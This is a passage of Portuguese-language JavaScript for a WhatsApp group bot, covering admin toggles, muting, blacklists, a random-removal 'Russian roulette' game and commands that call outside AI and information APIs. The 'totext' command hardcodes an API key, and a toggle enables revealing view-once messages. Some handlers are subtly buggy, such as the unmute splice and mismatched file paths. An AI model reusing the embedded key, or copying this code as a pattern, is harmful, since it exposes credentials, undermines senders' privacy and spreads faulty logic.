if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isX9VisuUnica) return reply('O recurso de revelar visu Ãºnica jÃ¡ estÃ¡ ativado.')
dataGp[0].visuUnica = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de revelar visu Ãºnica neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isX9VisuUnica) return reply('O recurso de revelar visu Ãºnica jÃ¡ estÃ¡ desativado.')
dataGp[0].visuUnica = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de revelar visu Ãºnica neste grupo.')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'so_adm':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(So_Adm) return reply('O modo para somente adminstradores usarem o bot, jÃ¡ se encontra ativo no grupo senhor(a)!')
dataGp[0].soadm = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de sÃ³ adm utilizar comandos neste grupo.')
} else if(Number(args[0]) === 0) {
if(!So_Adm) return reply('O modo para somente adminstradores usarem o bot atualmente jÃ¡ estÃ¡ desativado no grupo.')
dataGp[0].soadm = false
setGp(dataGp)
reply('Desativou o recurso de sÃ³ adm utilizar comandos neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'odelete':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins && !SoDono) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(IS_DELETE) return reply('O recurso de delete jÃ¡ estÃ¡ ativado.')
nescessario.Odelete = true
setNes(nescessario)
reply('Ativou com sucesso o recurso de delete nos grupos.')
} else if(Number(args[0]) === 0) {
if(!IS_DELETE) return reply('O recurso de delete jÃ¡ estÃ¡ desativado.')
nescessario.Odelete = false
setNes(nescessario)
reply('ï¸Desativou com sucesso o recurso de delete nos grupos.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'antifake':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins && !SoDono) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntifake) return reply('O recurso de antifake neste grupo jÃ¡ estÃ¡ ativado.')
dataGp[0].antifake = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de antifake neste grupo!')
} else if(Number(args[0]) === 0) {
if(!isAntifake) return reply('O recurso de antifake neste grupo jÃ¡ estÃ¡ desativado.')
dataGp[0].antifake = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de antifake neste grupo!')
} else {
reply('1 para ativar, 0 para desativar.')
}
break

case 'prefixos':
if(!isGroup) return reply(mess.onlyGroup())
if(!isMultiP) return reply(`Para usar este comando, vocÃª deve ativar o comando, multiprefix\nExemplo: ${prefix}multiprefixo`)
if(dataGp[0].prefixos.length < 1) return reply("NÃ£o contem nenhum prefixo a mais adicionado neste grupo.")
reply(`Lista de prefixos para uso do bot, no Grupo: *${groupName}*:\nâ€¢ *[Total: ${dataGp[0].prefixos.length}]* - ${dataGp[0].prefixos.map((v, index) => `( ${v} )`).join(", ")}`)
break

case 'add_prefixo':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isMultiP) return reply(`Para usar este comando, vocÃª deve ativar o comando, multiprefix\nExemplo: ${prefix}multiprefixo`)
if(ANT_LTR_MD_EMJ(q)) return reply("NÃ£o pode letra modificada, nem emoji..")
if(!q.trim()) return reply("Determine o novo prefixo, nÃ£o pode espaÃ§o vazio...")
if(q.trim() > 1) return reply(`Calma, o prefixo sÃ³ pode ser um\nExemplo: ${prefix+command} _\nAe o bot vai passar Ã¡ responder _ como prefixo do bot..`)
if(dataGp[0].prefixos.indexOf(q.trim()) >= 0) return reply(`Esse prefixo jÃ¡ se encontra incluso, procure ver na lista dos prefixos\nExemplo: ${prefix}prefixos`)
dataGp[0].prefixos.push(q.trim())
setGp(dataGp)
reply(`Prefixo ${q.trim()} foi adicionado com sucesso na lista de prefixos para uso do bot, neste grupo...`)
break

case 'tirar_prefixo':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isMultiP) return reply(`Para usar este comando, vocÃª deve ativar o comando, multiprefix\nExemplo: ${prefix}multiprefixo`)  
if(ANT_LTR_MD_EMJ(q)) return reply("NÃ£o pode letra modificada, nem emoji..")
if(!q.trim()) return reply("Determine o prefixo que deseja tirar, nÃ£o pode espaÃ§o vazio...")
if(q.trim() > 1) return reply(`Calma, o prefixo sÃ³ pode ser tirado um por vez..\nExemplo: ${prefix+command} _\nAe o bot nÃ£o vai responder mais com _`)
if(dataGp[0].prefixos.indexOf(q.trim()) < 0) return reply(`Esse prefixo nÃ£o estÃ¡ incluso, procure ver na lista dos prefixos. Veja: ${prefix}prefixos`)
if(dataGp[0].prefixos.length == 1) return reply("Adicione um prefixo para pode tirar este, tem que ter pelo menos 1 prefixo jÃ¡ incluso dentro do sistema para tirar outro.")
dataGp[0].prefixos.splice(dataGp[0].prefixos.indexOf(q.trim()), 1)
setGp(dataGp)
reply(`Prefixo ${q.trim()} tirado com sucesso da lista de prefixos de uso deste grupo..`)
break

case 'multiprefixo': case 'multiprefix':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins && !SoDono) return reply(mess.onlyAdmins())
if(!isMultiP) {
dataGp[0].multiprefix = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de multi prefixos neste grupo.')
}
if(isMultiP) {
dataGp[0].multiprefix = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de multi prefixos neste grupo.')
}
break

case 'ephemeral': case 'msgtemp':
if (!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if (!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
getInfoG = await yoko.groupMetadata(from); /* Pegar as informaÃ§Ãµes total do grupo! */
if (getInfoG.ephemeralDuration == undefined) {
reply(`As mensagens temporÃ¡rias no grupo foram ativadas com sucesso.`)
await yoko.sendMessage(from, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL})
} else if (getInfoG.ephemeralDuration > 1) {
reply(`As mensagens temporÃ¡rias no grupo foram desativadas com sucesso.`)
await yoko.sendMessage(from, { disappearingMessagesInChat: false})
}
break

case 'rmphotogp': case 'rmfotogroup':
if (!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if (!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
reply(`A foto do grupo foi removida com sucesso.`)
await yoko.removeProfilePicture(from)
break

case 'antinotas':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAntiNotas) return reply('O recurso de anti notas jÃ¡ estÃ¡ ativado no grupo.')
dataGp[0].antinotas = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anti notas neste grupo.ï¸')
} else if(Number(args[0]) === 0) {
if(!isAntiNotas) return reply('O recurso de anti notas jÃ¡ estÃ¡ desativado no grupo.')
dataGp[0].antinotas = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anti notas neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'anticatalogo':
case 'anticatalg':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isAnticatalogo) return reply('O recurso de anti catÃ¡logos jÃ¡ se encontra ativo no grupo atualmente.')
dataGp[0].anticatalogo = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de anticatalogo neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isAnticatalogo) return reply('O recurso atualmente se encontra desativado no grupo.')
dataGp[0].anticatalogo = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de anticatalogo neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'bemvindo':
case 'welcome':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins && !SoDono) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isWelkom) return reply('O recurso de boas vindas jÃ¡ estÃ¡ ativo neste grupo.')
dataGp[0].wellcome[0].bemvindo1 = true
setGp(dataGp)
reply('Ativou com sucesso o recurso de bem vindo neste grupo.')
} else if(Number(args[0]) === 0) {
if(!isWelkom) return reply('O recuso de boas vindas jÃ¡ estÃ¡ desativado neste grupo.')
dataGp[0].wellcome[0].bemvindo1 = false
setGp(dataGp)
reply('Desativou com sucesso o recurso de bemvindo neste grupo.ï¸')
} else {
reply('1 para ativar, 0 para desativar')
}
break

case 'bemvindo2':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins && !SoDono) return reply(mess.onlyAdmins())
if(args.length < 1) return reply(`Digite da forma correta:\nComando: ${prefix + command} 1 para ativar `)
if(Number(args[0]) === 1) {
if(isWelkom2) return reply('O recurso jÃ¡ estÃ¡ ativado no grupo.')
dataGp[0].wellcome[1].bemvindo2 = true
setGp(dataGp)
reply('O recurso foi ativado.')
} else if(Number(args[0]) === 0) {
if(!isWelkom2) return reply('O recurso nÃ£o estÃ¡ ativado no grupo.')
dataGp[0].wellcome[1].bemvindo2 = false
setGp(dataGp)
reply('O recurso foi desativado.')
} else {
reply(`Digite da forma correta, ${prefix + command} 1, para ativar e 0 para desativar`)
}
break

case 'legendabv':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply('*Escreva a mensagem de boas-vindas*')
teks = body.slice(11)
if(isWelkom) {
dataGp[0].wellcome[0].legendabv = teks
setGp(dataGp)
reply('*Mensagem de boas vindas definida com sucesso!*')
} else {
reply(`Ative o ${prefix}bemvindo 1`)
}
break

case 'legendabv2':  
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply('*Escreva a mensagem de boas-vindas*')
teks = body.slice(12)
if(isWelkom2) {
dataGp[0].wellcome[1].legendabv = teks
setGp(dataGp)
reply('*Mensagem de boas vindas2 definida com sucesso!*')
} else {
reply(`Ative o ${prefix}bemvindo2 1`)
}
break

case 'legendasaiu':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply("Escreva a mensagem de saÃ­da ou para desativar, use: 0")
teks = body.slice(13)
if(isWelkom) {
dataGp[0].wellcome[0].legendasaiu = Number(teks) === 0 ? 0 : teks
setGp(dataGp)
reply('Mensagem de saÃ­da do bemvindo foi definida com sucesso!')
} else {
reply(`Ative o ${prefix}bemvindo para o recurso de ediÃ§Ã£o de mensagem.`)
}
break

case 'legendasaiu2':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(q.length < 1) return reply('Escreva a mensagem de saÃ­da ou para desativar, use: 0')
if(isWelkom2) {
dataGp[0].wellcome[1].legendasaiu = Number(teks) === 0 ? 0 : q
setGp(dataGp)
reply('Mensagem de saÃ­da do bemvindo2 foi definida com sucesso!')
} else {
reply(`Ative o ${prefix}bemvindo2 para o recurso de ediÃ§Ã£o de mensagem.`)
}
break

case 'legenda_estrangeiro':
case 'legenda_estrangeiros': 
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply('*Escreva a mensagem de remoÃ§Ã£o de estrangeiros*')
if(isAntifake) {
dataGp[0].legenda_estrangeiro = q
setGp(dataGp)
reply('*Mensagem de remoÃ§Ã£o de estrangeiros definida com sucesso!*')
} else {
reply(`Ative o antifake primeiro para definir uma legenda, com: ${prefix}antifake 1`)
}
break

case 'legenda_video': 
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply('*Escreva a mensagem de remoÃ§Ã£o no antivideo*')
if(isAntiVid) {
dataGp[0].legenda_video = q
setGp(dataGp)
reply('*Mensagem de remoÃ§Ã£o de video definida com sucesso!*')
} else {
reply(`Ative o antivideo primeiro para definir uma legenda, com: ${prefix}antivideo`)
}
break

case 'legenda_imagem': 
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply('*Escreva a mensagem de remoÃ§Ã£o no antiimg*')
if(isAntiImg) {
dataGp[0].legenda_imagem = q
setGp(dataGp)
reply('*Mensagem de remoÃ§Ã£o de imagem definida com sucesso!*')
} else {
reply(`Ative o anti-imagem primeiro para definir uma legenda, com: ${prefix}antiimg`)
}
break

case 'legenda_documento': 
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply('*Escreva a mensagem de remoÃ§Ã£o no antidoc*')
if(Antidoc) {
dataGp[0].legenda_documento = q
setGp(dataGp)
reply('*Mensagem de remoÃ§Ã£o de documento definida com sucesso!*')
} else {
reply(`Ative o antidoc primeiro para definir uma legenda, com: ${prefix}antidoc 1`)
}
break

case 'addautorm':
case 'addautoban':
case 'listanegra':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins && !SoDono) return reply('Precisa ser Dono ou Adm')
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
if(!mrc_ou_numero) return reply("Marque a mensagem do usuÃ¡rio com o comando ou utilize o comando com o nÃºmero do usuÃ¡rio que deseja adicionar na lista negra..")
if(dataGp[0].listanegra.includes(mrc_ou_numero)) return reply('*Esse NÃºmero ja esta incluso*')
dataGp[0].listanegra.push(mrc_ou_numero)
setGp(dataGp)
reply(`*NÃºmero adicionado a lista de autoban*`)
break

case 'autobang':
case 'listanegrag':
if(!SoDono) return reply(mess.onlyOwner())
if(!mrc_ou_numero) return reply("Marque a mensagem do usuÃ¡rio com o comando ou utilize o comando com o nÃºmero do usuÃ¡rio que deseja adicionar na lista negra Global..")
if(listanegraG.includes(mrc_ou_numero)) return reply('*Esse NÃºmero ja esta incluso*')
listanegraG.push(mrc_ou_numero)
fs.writeFileSync('./yoko/configs/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`*NÃºmero adicionado a lista de autoban*`)
break

case 'tirardalistag':
if(!SoDono) return reply(mess.onlyOwner())
if(!mrc_ou_numero) return reply("Marque a mensagem do usuÃ¡rio com o comando ou utilize o comando com o nÃºmero do usuÃ¡rio que deseja tirar da lista negra..")
if(!listanegraG.includes(mrc_ou_numero)) return reply('*Esse NÃºmero nÃ£o esta incluso*')
var i = listanegraG.indexOf(mrc_ou_numero)
listanegraG.splice(i, 1)
fs.writeFileSync('./yoko/configs/nescessario.json', JSON.stringify(nescessario, null, '\t'))
reply(`*NÃºmero foi removido da lista negra*`)
break

case 'delremover':
case 'delautorm':  
case 'delautoban': 
case 'tirardalista':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins && !SoDono) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
if(!mrc_ou_numero) return reply("Marque a mensagem do usuÃ¡rio com o comando ou utilize o comando com o nÃºmero do usuÃ¡rio que deseja tirar da lista negra..")
if(!dataGp[0].listanegra.includes(mrc_ou_numero)) return reply('*Esse NÃºmero nÃ£o esta incluso*')
var i = dataGp[0].listanegra.indexOf(mrc_ou_numero)
dataGp[0].listanegra.splice(i, 1)
setGp(dataGp)
reply(`*NÃºmero foi removido da lista de autoban*`)
break

case 'listban':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(dataGp[0].listanegra.length < 1) return reply('*Nenhum NÃºmero nÃ£o foi adicionado*')
teks = '*NÃºmeros que vou moer na porrada se voltar:*\n'
for(i=0;i<dataGp[0].listanegra.length;++i) {teks += `â¤ *${dataGp[0].listanegra[i].split('@')[0]}*\n`}
teks += '*Esses ai vou descer meu martelo do ban.*'
reply(teks)
break

case 'mute': case 'mutar':
if(!isGroup) return reply(mess.onlyGroup());
if(!isGroupAdmins) return reply(mess.onlyAdmins());
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
if(!menc_os2) return reply(`ğŸ¯ Por favor, mencione o usuÃ¡rio ou marque a mensagem do alvo que vocÃª deseja mutar.`);
if(menc_os2 == botNumber) return reply("âŒï¸ï¸ NÃ£o Ã© possÃ­vel mutar o bot! VocÃª Ã© louco?");
if(menc_os2 == nmrdn) return reply("Quem vocÃª pensa que Ã©, para mutar meu proprietÃ¡rio(a)?");
if(vip.map(i => i.id).includes(menc_os2)) return reply("âŒï¸ï¸ NÃ£o Ã© possÃ­vel mutar usuÃ¡rios que contÃ©m vip no bot!");
if(groupAdmins.includes(menc_os2)) return reply("âŒï¸ NÃ£o Ã© possÃ­vel mutar um(a) adminstrador(a) do grupo.");
if(!JSON.stringify(groupMembers).includes(menc_os2)) return reply("âŒ ï¸NÃ£o Ã© possÃ­vel mutar uma pessoa que atualmente nÃ£o participa mais deste grupo.");
if(muted[muted.map(i => i.grupo).indexOf(from)].usus.includes(menc_os2)) return mention(`O participante: '@${menc_os2.split("@")[0]}' jÃ¡ estÃ¡ na lista de mutados, para desmutar o usuÃ¡rio, use: ${prefix}desmute.`);
//// ADICIONA O USUÃRIO Ã€ LISTA:
mention(`O participante '@${menc_os2.split("@")[0]}' foi mutado pelo administrador: '@${sender.split("@")[0]}'. Se ele(a) falar alguma coisa, serÃ¡ removido do grupo!`);
muted[muted.map(i => i.grupo).indexOf(from)].usus.push(menc_os2)
fs.writeFileSync("./yoko/bunker/database/grupos/muted.json", JSON.stringify(muted, null, 2));
break

case 'desmute': case 'desmutar':
if(!isGroup) return reply(mess.onlyGroup());
if(!isGroupAdmins) return reply(mess.onlyAdmins());
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin());
if(!menc_os2) return reply(`ğŸ¯ Por favor, mencione o usuÃ¡rio ou marque a mensagem do alvo que vocÃª deseja desmutar.`);
if(!muted[muted.map(i => i.grupo).indexOf(from)].usus.includes(menc_os2)) return mention(`O participante: '@${menc_os2.split("@")[0]}' nÃ£o estÃ¡ na lista de mutados do grupo.`);
//// REMOVE O USUÃRIO DA LISTA:
mention(`O participante '@${menc_os2.split("@")[0]}' foi desmutado com sucesso pelo adminstrador(a): '@${sender.split("@")[0]}'.`);
muted[muted.map(i => i.grupo).indexOf(from)].usus.splice(menc_os2);
fs.writeFileSync("./yoko/bunker/database/usuarios/muted.json", JSON.stringify(muted, null, 2));
break 

case 'mutelist': case 'listamutados':
if(muted[muted.map(i => i.grupo).indexOf(from)].usus.length == 0) return reply(`NÃ£o existe nenhum usuÃ¡rio mutado neste grupo.`);
usus__ = `[Total: *${muted[muted.map(i => i.grupo).indexOf(from)].usus.length}*] - Lista de participantes mutados no grupo:\nâ€“\n`;
usus__ += muted[muted.map(i => i.grupo).indexOf(from)].usus.map((v, index) =>  `â€¢ *[${index+1}]* - @${v.split('@')[0]}`).join('\n');
await mention(usus__);
break

case 'roletarussa':
if(!isGroup) return reply(mess.onlyGroup())
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(!isBotGroupAdmins) return reply(mess.onlyBotAdmin())
TAMBOR = ["na perna.","na cabeÃ§a.","no pescoÃ§o.","no peito.","no olho.","no estÃ´mago.","na boca.","na perna.","na testa.","no braÃ§o."]
C2 = somembros[Math.floor(Math.random() * somembros.length)]
if(somembros.length == 0) return reply("NÃ£o existe *membros comuns* no grupo, somente admins.")
if(C2 === sender || C2 === botNumber) return mentions(`Escolhi *@${C2.split('@')[0]}*, mas conseguiu escapar...`, [C2], true)
if(C2 === sender || C2 === numerodono[0]) return mentions(`Escolhi *@${C2.split('@')[0]}*, mas conseguiu escapar...`, [C2], true)		
reply(`A escolha Ã© minha! 1 membro irÃ¡ morrer, que os jogos comecem...`)
setTimeout(async() => { 
await mentions(`Que pena... vocÃª nÃ£o sobreviveu ao meu jogo *@${C2.split('@')[0]}*, hora de enterrar o cadÃ¡ver, infelizmente morreu com tiro ${TAMBOR[Math.floor(Math.random() * (TAMBOR.length))]}`, [C2], true) 
}, 5000)	 
setTimeout(async() => {
await yoko.groupParticipantsUpdate(from, [C2], "remove")
}, 6000)
break

case 'dinextenso': 
if(!q.includes(".")) return reply(`âŒï¸ - Coloque apenas nÃºmeros para realizar a transformaÃ§Ã£o de digitos numÃ©rico para nÃºmeros em extenso.\nPor exemplo: *${prefix}dinextenso 500.00 ou 756.50*, tudo que vocÃª colocar os valores deve colocar um ponto(.) para converter os valores.`)
try {
data = await fetchJson(`https://api.invertexto.com/v1/number-to-words?token=${API_KEY_INVERTEXTO}&number=${q}&language=pt&currency=BRL`);
reply(`*${q}* : ${capitalizeFirstLetter(data.text)}`);
} catch(error) {
reply(mess.error())
}
break

case 'validarcpf': case 'validarcnpj':
if(command === "validarcpf") {
if(!q) return reply("Digite um CPF para realizar a verificaÃ§Ã£o se Ã© vÃ¡lido ou invÃ¡lido...")
if(q.length < 11) return reply("VocÃª digitou um cpf que nÃ£o tem 11 dÃ­gitos, verifique se colocou pontuaÃ§Ã£o, se estiver retire.")
try {
data = await fetchJson(`https://api.invertexto.com/v1/validator?token=${API_KEY_INVERTEXTO}&value=${q}`)
if(data.valid == true) return reply("VÃ¡lido.")
if(data.valid == false) return reply("InvÃ¡lido.")
} catch(error) {reply(mess.error())}
} else if(command === "validarcnpj") {
if(!q) return reply("Digite um CNPJ para realizar a verificaÃ§Ã£o se Ã© vÃ¡lido ou invÃ¡lido!")
if(q.length < 14) return reply("VocÃª digitou um CNPJ que nÃ£o tem 14 dÃ­gitos, verifique se colocou pontuaÃ§Ã£o, se estiver retire.")
try {
data = await fetchJson(`https://api.invertexto.com/v1/validator?token=${API_KEY_INVERTEXTO}&value=${q}`)
if(data.valid == true) return reply("VÃ¡lido.")
if(data.valid == false) return reply("InvÃ¡lido.")
} catch(error) {reply(mess.error())}
}
break

case 'createimg': case 'texttoimage': case 'imagine':
if(!q) return reply(`O que vocÃª deseja criar amiguinho? Coloque apÃ³s o comando o que vocÃª deseja criar... Por exemplo: ${prefix+command} macaco dirigindo uma bmw`);
try {
await replyWithReaction('OlÃ¡, estou criando a imagem a partir de seu questionamento, aguarde senhor(a)...', {react: {text: 'ğŸ¨', key: info.key}});
dataResultAI = await fetchJson(`https://hercai.onrender.com/v3/text2image?prompt=${q}`);
  await yoko.sendMessage(from, {image: {url: dataResultAI.url}}, {quoted: selo});
} catch(error) {
await replyWithReaction(mess.error(), {react: {text: 'âŒ', key: info.key}});
}
break

case 'pergunta': case 'openai': case 'gpt': case 'chatgpt':
try {
reply("Aguarde, criando / pesquisando sobre o que esta perguntando ou pedindo.");
ABC = await fetchJson(`https://api.bronxyshost.com.br/api-bronxys/PERGUNTE_E_EU_RESPONDO?q=${q.trim()}&apikey=${API_KEY_BRONXYS}`)
reply(`( ${ABC.msg} )`)
} catch { 
reply("Erro..")
}
break;


case 'redacao':
if(!q) return reply(`VocÃª esqueceu de colocar o tema de sua redaÃ§Ã£o ao lado do comando.`)
try {
let { key } = await yoko.sendMessage(from, {text: `Estou processando sua solicitaÃ§Ã£o. Isso pode levar alguns segundos...`}, {quoted: selo})
promptUser = `Crie um texto dissertativo-argumentativo com o tema: ${q}`
anu1 = await fetchJson(`https://aemt.me/gpt4?text=${promptUser}`)
await yoko.sendMessage(from, {text: mess.respostaRedacao(anu1), edit: key});
} catch(error) {
return reply(mess.error())
}
break

case 'summerize':
if(!q) return reply(`VocÃª esqueceu de colocar o que vocÃª deseja resumir ao lado do comando.`)
try {
let { key } = await yoko.sendMessage(from, {text: `Estou resumindo o texto solicitado. Isso pode levar alguns segundos...`}, {quoted: selo})
promptUser = `FaÃ§a um resumo bÃ¡sico do texto apresentado: ${q}`
anu1 = await fetchJson(`https://aemt.me/gpt4?text=${promptUser}`)
await yoko.sendMessage(from, {text: mess.respostaResumida(anu1), edit: key})
} catch(error) {
return reply(mess.error())
}
break

case 'totext': 
if (!isQuotedAudio) return reply("Por favor, mencione um Ã¡udio para realizar a leitura do Ã¡udio.")
if(info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage.fileLength > 2100000) return reply("SÃ³ realizo a transcriÃ§Ã£o de Ã¡udio de atÃ© *2MB*, envie um arquivo menor.")
try {
let getBufferAudio = await getFileBuffer(info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage, 'audio')
await yoko.sendMessage(from, {text: `Estou realizando a transcriÃ§Ã£o do Ã¡udio para texto, aguarde...`}, {quoted: selo});
fs.writeFileSync(`./yoko/bunker/database/data/media/audios/totext/totext-${sender}.mp3`, getBufferAudio)
client = new AssemblyAI({apiKey: "11d7fb1a4e8f4e4fac85d3b9be844b4a"})
data = await client.transcripts.create({audio_url: `./yoko/bunker/database/data/media/audios/totext/totext-${sender}.mp3`, language_code: "pt"})
if (data.status === 'error') return reply("Ocorreu um erro ao transcrever o Ã¡udio! Por favor, tente novamente.")
if (data.words.length == 0) return reply("NÃ£o foi possÃ­vel transcrever o Ã¡udio enviado.")
yoko.sendInteractiveTXT(from, `Texto extraÃ­do do Ã¡udio: â¬\n\tâ€¢ Texto: '${data.text}'\nâ€“\nâ€¢ Total de palavra(s) detectada(s) no Ã¡udio mencionado: *${data.words.length} palavra(s).*\nâ€¢ ID: *${data.id}*`, `Â© Ayanokoji Md`, {participant: sender, quotedMessage: info.message}, {buttons: [{name: "cta_copy", buttonParamsJson: JSON.stringify({display_text: "Copiar", id: `0`, copy_code: data.text, disabled: true})}]});

DLT_FL(`./yoko/bunker/database/data/media/audios/totext/totext-${sender}.mp3`)
} catch(error) {
reply(mess.error())
}
break

case 'wikipedia': case 'wiki':
try {
if(!q) return reply(`Exemplo: ${prefix+command} JavaScript`)
reply(`Aguarde, pesquisando sobre o que estÃ¡ perguntando..`)
wikip = await axios.get(`https://pt.wikipedia.org/w/api.php?action=query&format=json&list=search&srsearch=${encodeURIComponent(q)}&prop=info&inprop=url`);
wikis = await axios.get(`https://pt.wikipedia.org/w/api.php?format=json&action=query&prop=extracts&exintro&explaintext&redirects=1&pageids=${wikip.data.query.search[0].pageid}`);
reply(mess.wikiResposta(wikis))
} catch(error) {
reply(mess.error())
}
break

case 'book':
if (args.length == 0) return reply(`*Exemplo:* ${prefix+command} Nome do Livro`)
try {
const takeBook = await axios.get(`https://www.googleapis.com/books/v1/volumes?q=${encodeURIComponent(q)}&langRestrict=pt`);
const getBook = await axios.get(`${takeBook.data.items[0].selfLink}`);
var bookImage = await getBuffer(getBook.data.volumeInfo.imageLinks.thumbnail)
await yoko.sendMessage(from, {image: bookImage, caption: mess.searchBooks(getBook)}, {quoted: selo})
} catch(error) {
reply(mess.error())
}
break

case 'clima':
if (args.length == 0) return reply(`*Exemplo:* ${prefix}Clima MaceiÃ³`)
try {
const wttrin = (await axios.get(`https://pt.wttr.in/${encodeURIComponent(q)}?format=j1`)).data;
var wttrImage = await getBuffer(`https://wttr.in/${encodeURIComponent(q)}.png`)
await yoko.sendMessage(from, {image: wttrImage, caption: mess.clima(wttrin)}, {quoted: selo})
} catch(error) {
reply(mess.error())
}
break

case 'simi':
if(!isGroup) return reply(mess.onlyGroup())
try {
datasimi = await fetchJson(`https://api.simsimi.vn/v1/simtalk`, {method: 'POST', headers: {'content-type': "application/x-www-form-urlencoded"}, body: "text="+q+"&lc=pt"});
reply(datasimi.message);
} catch (e) {
return reply("Resposta nÃ£o encontrada..");
}
break

case 'simih':
if(!isGroupAdmins) return reply(mess.onlyAdmins())
if(args.length < 1) return reply(`Use 1 pra ativar ou 0 pra desativar. Caso deseja ativar, use essa forma: ${prefix+command} 1, caso seja desativar e sÃ³ trocar o 1 pelo 0.`)
if(Number(args[0]) === 1) {
if(isSimi) return reply('O modo simih jÃ¡ se encontra ativo neste grupo.')
dataGp[0].simi1 = true
setGp(dataGp)
reply('Ativado com sucesso o modo simi neste grupo..')
} else if(Number(args[0]) === 0) {
if(!isSimi) return reply('O modo simih jÃ¡ se encontra desativado neste grupo.')
dataGp[0].simi1 = false
setGp(dataGp)
